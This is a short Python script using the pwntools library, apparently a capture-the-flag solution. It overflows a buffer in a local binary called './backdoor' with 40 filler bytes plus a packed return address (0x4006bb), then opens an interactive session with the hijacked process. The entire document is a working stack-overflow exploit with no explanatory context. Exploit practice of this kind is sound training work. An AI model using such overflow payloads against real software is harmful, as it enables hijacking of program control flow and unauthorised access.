from pwn import *

p = process('./backdoor')

context.log_level = 'debug'

target = 0x4006bb
address = p64(target)
payload = 'A'*40 + address + '\n'

p.sendafter('friend:\n', payload)
p.interactive()